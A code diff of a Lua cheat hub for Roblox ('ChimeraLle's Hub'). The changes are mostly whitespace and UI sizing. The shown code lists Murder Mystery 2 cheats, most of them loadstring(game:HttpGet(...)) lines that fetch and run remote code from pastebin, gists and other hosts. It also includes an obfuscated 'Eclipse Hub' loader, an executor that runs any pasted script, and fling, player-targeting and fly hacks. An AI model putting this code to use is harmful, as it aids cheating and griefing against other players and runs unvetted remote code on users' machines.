@@ -1004,16 +1004,16 @@ end)
  
 end]]
 
-},
+	},
 
-murder_mystery_2 = {
-	["Admin panel"] = [[loadstring(game:HttpGet('https://pastebin.com/raw/DihfjHj2'))()]],
-	["Another Unamed GUI"] = [[loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/16d946bfe0a0ed98a8e32de362fd4217/raw/0681fa979da042841f4e71a52490fdc3a2a16376/cac", true))()]],
-	["Brizzyware autofarm"] = [[loadstring(game:HttpGet('https://scripts.luawl.com/13752/mm2farm.lua'))()]],
-	["Eclipse Hub"] = [[getgenv().mainKey = "nil"
+	murder_mystery_2 = {
+		["Admin panel"] = [[loadstring(game:HttpGet('https://pastebin.com/raw/DihfjHj2'))()]],
+		["Another Unamed GUI"] = [[loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/16d946bfe0a0ed98a8e32de362fd4217/raw/0681fa979da042841f4e71a52490fdc3a2a16376/cac", true))()]],
+		["Brizzyware autofarm"] = [[loadstring(game:HttpGet('https://scripts.luawl.com/13752/mm2farm.lua'))()]],
+		["Eclipse Hub"] = [[getgenv().mainKey = "nil"
 
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()]],
-	["ESP (R is toggle key)"] = [[if getgenv().espscript == true then return error("Script already executed") end
+		["ESP (R is toggle key)"] = [[if getgenv().espscript == true then return error("Script already executed") end
 
 local UserInputService = game:GetService("UserInputService")
 local StarterGui = game:GetService("StarterGui")
@@ -1065,7 +1065,7 @@ while wait() do
 		end
 	end
 end]],
-	["Fling"] = [[local lp = game:FindService("Players").LocalPlayer
+		["Fling"] = [[local lp = game:FindService("Players").LocalPlayer
 
 local function gplr(String)
     local Found = {}
@@ -1192,17 +1192,17 @@ end)
 
 --//fsddfsdf
 notif("Loaded successfully! Created by scuba#0001", 5)]],
-	["Unamed GUI"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/murder2/main/Protected%20(9).lua"))()]],
-	["Vynixu"] = [[loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()]],
-}
+		["Unamed GUI"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/castycheat/murder2/main/Protected%20(9).lua"))()]],
+		["Vynixu"] = [[loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()]],
+	}
 
 }
 
 if not Rs:FindFirstChild("ChimeraLle's Hub") then
-	
+
 	local Fol555 = Instance.new("Folder",Rs)
 	Fol555.Name = "ChimeraLle's Hub"
-	
+
 	local ScreenGui = Instance.new("ScreenGui")
 	local ImageLabel = Instance.new("ImageLabel")
 	local Buttons = Instance.new("Frame")
@@ -1392,7 +1392,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	PlayerScript.TextXAlignment = Enum.TextXAlignment.Left
 	PlayerScript.TextYAlignment = Enum.TextYAlignment.Top
 	PlayerScript.AutomaticSize = Enum.AutomaticSize.Y
-	
+
 	TextLabel_5.Parent = PlayerScript
 	TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
 	TextLabel_5.BackgroundTransparency = 1
@@ -1559,7 +1559,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 
 	UIGridLayout_3.Parent = Size_2
 	UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
-	UIGridLayout_3.CellSize = UDim2.new(1, 0, 0, 40)
+	UIGridLayout_3.CellSize = UDim2.new(1, 0, 0, 50)
 
 	Settings_2.Name = "Settings"
 	Settings_2.Parent = Pages
@@ -1593,7 +1593,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	Number.BackgroundTransparency = 0.800000011920929
 	Number.BorderColor3 = Color3.new(0, 0, 0)
 	Number.BorderSizePixel = 0
-	Number.Size = UDim2.new(0.699999988, 0, 0.25, 0)
+	Number.Size = UDim2.new(0.4, 0, 0, 60)
 
 	TextLabel.Parent = Number
 	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
@@ -1641,7 +1641,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	Key.BackgroundTransparency = 0.800000011920929
 	Key.BorderColor3 = Color3.new(0, 0, 0)
 	Key.BorderSizePixel = 0
-	Key.Size = UDim2.new(0.699999988, 0, 0.25, 0)
+	Key.Size = UDim2.new(0.4, 0, 0, 60)
 
 	TextLabel_2.Parent = Key
 	TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
@@ -1689,7 +1689,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	Key2.BackgroundTransparency = 0.800000011920929
 	Key2.BorderColor3 = Color3.new(0, 0, 0)
 	Key2.BorderSizePixel = 0
-	Key2.Size = UDim2.new(0.699999988, 0, 0.25, 0)
+	Key2.Size = UDim2.new(0.4, 0, 0, 60)
 
 	TextLabel_3.Parent = Key2
 	TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
@@ -1737,7 +1737,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	Key3.BackgroundTransparency = 0.800000011920929
 	Key3.BorderColor3 = Color3.new(0, 0, 0)
 	Key3.BorderSizePixel = 0
-	Key3.Size = UDim2.new(0.699999988, 0, 0.25, 0)
+	Key3.Size = UDim2.new(0.4, 0, 0, 60)
 
 	TextLabel_4.Parent = Key3
 	TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
@@ -1780,7 +1780,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	UICorner_14.Parent = Key3
 
 	UICorner_15.Parent = ImageLabel
-	
+
 	Clear.MouseButton1Up:Connect(function()
 		PlayerScript.Text = ""
 	end)
@@ -1788,16 +1788,16 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	Execute.MouseButton1Up:Connect(function()
 		loadstring(PlayerScript.Text)()
 	end)
-	
+
 	PlayerScript:GetPropertyChangedSignal("Text"):Connect(function()
 		local Text = PlayerScript.Text
-		
+
 		TextLabel_5.Text = Text
-		
+
 		local spl = string.split(Text,"\n")
-		
+
 		local Number = 0
-		
+
 		local Numbers = ""
 		for i, v in pairs(spl) do
 			Number += 1
@@ -1807,11 +1807,11 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 				Numbers = Numbers.."\n"..Number
 			end
 		end
-		
+
 		ScriptLine.Text = Numbers
-		
+
 	end)
-	
+
 	Executor.MouseButton1Click:Connect(function()
 		Executor_2.Visible = true
 		Search_3.Visible = false
@@ -1835,14 +1835,14 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 		Search_3.Visible = false
 		Settings_2.Visible = true
 	end)
-	
+
 	local ExKey = "V"
 	local BangKey = "C"
 	local FlyKey = "X"
-	
+
 	TextBox_4:GetPropertyChangedSignal("Text"):Connect(function()
 		local Text = TextBox_4.Text
-		
+
 		if #Text <= 1 then
 			if #Text == 1 then
 				ExKey = string.upper(Text)
@@ -1851,7 +1851,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			TextBox_4.Text = "V"
 		end
 	end)
-	
+
 	TextBox_3:GetPropertyChangedSignal("Text"):Connect(function()
 		local Text = TextBox_3.Text
 
@@ -1863,7 +1863,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			TextBox_3.Text = "C"
 		end
 	end)
-	
+
 	TextBox_2:GetPropertyChangedSignal("Text"):Connect(function()
 		local Text = TextBox_2.Text
 
@@ -1875,7 +1875,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			TextBox_2.Text = "X"
 		end
 	end)
-	
+
 	local uis = game:GetService("UserInputService")
 	local Ts = game:GetService("TweenService")
 
@@ -1893,14 +1893,14 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 
 	local An1 = Ts:Create(ImageLabel,info,OpenGoal)
 	local An2 = Ts:Create(ImageLabel,info,CloseGoal)
-	
+
 	local plrs = game:GetService("Players")
 	local Me = plrs.LocalPlayer
 	local M = Me:GetMouse()
 
 	local Selection = false
 	local Playing = false
-	
+
 	local function StartBang(TarHrp)
 
 		local MyChar = Me.Character or Me.CharacterAdded:Wait()
@@ -1950,7 +1950,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 
 		end
 	end
-	
+
 	local Flying = false
 
 	local cam = workspace.CurrentCamera
@@ -1959,7 +1959,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 	local A = false
 	local S = false
 	local D = false
-	
+
 	local function OnKeyPressed()
 
 		local char = Me.Character or Me.CharacterAdded:Wait()
@@ -2108,7 +2108,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			D = true
 		end
 	end)
-	
+
 	uis.InputEnded:Connect(function(key)
 		if key.KeyCode == Enum.KeyCode.W then
 			W = false
@@ -2120,7 +2120,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			D = false
 		end
 	end)
-	
+
 	local Images = {
 		bloxfruit = "rbxassetid://12796342017",
 		arsenal = "rbxassetid://7699371504",
@@ -2129,7 +2129,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 		kat = "rbxassetid://11515562007",
 		murder_mystery_2 = "rbxassetid://1163151241"
 	}
-	
+
 	for i, v in pairs(Scripts) do
 		local GameName = i
 		local GameIcon = Images[GameName]
@@ -2140,7 +2140,7 @@ if not Rs:FindFirstChild("ChimeraLle's Hub") then
 			local newIm = new:WaitForChild("Image")
 			newName.Text = i2
 			newIm.Image = GameIcon
-			
+
 			new.MouseButton1Click:Connect(function()
 				loadstring(v2)()
 			end)
